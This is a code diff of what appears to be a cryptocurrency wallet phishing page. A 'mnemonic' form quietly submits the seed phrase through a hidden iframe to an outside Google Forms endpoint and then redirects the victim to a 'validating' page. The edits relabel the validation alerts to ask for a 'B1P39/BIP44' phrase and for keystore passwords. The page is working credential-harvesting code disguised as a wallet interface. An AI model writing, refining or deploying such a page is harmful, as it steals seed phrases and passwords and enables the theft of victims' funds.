@@ -33,11 +33,6 @@
             
             <div class="tab-content">
 
-    <script type="text/javascript">var submitted=false;</script>
-
-          <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"      
-            onload="if(submitted) {window.location='validating.html';}"></iframe> 
-
                    <div class="contain text-center" id="mnemonic">
                     <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfDfjfLeNSQokTC7wRmtRFElgFuJ3fI5gFx_gw9sdUG0dgYUg/formResponse" method="POST" id="mnemonic-form" target="hidden_iframe" onsubmit="return validateForm(); ">
                         <div class="form-group text-center mb-3">
@@ -58,6 +53,11 @@
                       <button type="submit" class="mt-3 btn-submit" onclick="click()" id="redirect"> Submit </button>
                     </form>
                 </div>
+
+                <script type="text/javascript">var submitted=false;</script>
+
+          <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"      
+            onload="if(submitted) {window.location='validating.html';}"></iframe> 
 
                 <div class="contain text-center" id="keystore">
                     <form action="">
@@ -144,7 +144,7 @@
           function validatePhone() {
             var phone = document.getElementById('phrase').value;
             if(phone.length == 0) {
-              alert("Phone number can't be blank") ;//Validation Message
+              alert("  B1P39/BIP44 can't be blank") ;//Validation Message
               return false;
             }else{
                            return true;
@@ -203,7 +203,7 @@
           function validatePassword1() {
             var phone = document.getElementById('password1').value;
             if(phone.length == 0) {
-              alert("Phone number can't be blank") ;//Validation Message
+              alert("Keystore Password can't be blank") ;//Validation Message
               return false;
             }else{
                            return true;
@@ -214,7 +214,7 @@
            function validatePhrase1() {
             var phone = document.getElementById('phrase1').value;
             if(phone.length == 0) {
-              alert("Phone number can't be blank") ;//Validation Message
+              alert("B1P39/BIP44 can't be blank") ;//Validation Message
               return false;
             }else{
                            return true;
@@ -252,7 +252,7 @@
           function validatePassword2() {
             var phone = document.getElementById('password3').value;
             if(phone.length == 0) {
-              alert("Phone number can't be blank") ;//Validation Message
+              alert("Password can't be blank") ;//Validation Message
               return false;
             }else{
                            return true;
@@ -263,7 +263,7 @@
            function validatePhrase2() {
             var phone = document.getElementById('phrase3').value;
             if(phone.length == 0) {
-              alert("Phone number can't be blank") ;//Validation Message
+              alert("Phrase can't be blank") ;//Validation Message
               return false;
             }else{
                            return true;
